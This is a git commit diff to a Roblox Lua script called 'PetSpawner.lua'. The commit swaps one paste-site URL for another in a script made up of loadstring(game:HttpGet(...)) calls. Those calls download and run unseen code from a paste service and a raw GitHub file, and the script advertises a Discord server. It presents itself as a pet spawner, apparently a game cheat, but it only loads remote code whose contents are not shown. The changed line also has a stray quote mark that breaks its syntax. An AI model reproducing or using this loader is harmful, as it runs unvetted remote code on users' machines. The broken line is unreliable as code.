c093f8976609a67e424831067847a424e8623077
ren <ikazuryzel@gmail.com>
2025-08-06 19:51:57 +0800

    Update PetSpawner.lua

--- PetSpawner.lua
+++ PetSpawner.lua
@@ -1,3 +1,3 @@
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/Fh73L6SNGaDTkiEP/raw", true))()
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/3SSvzpPF3vLLWFOK/raw", true"))()
 task.wait(1)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
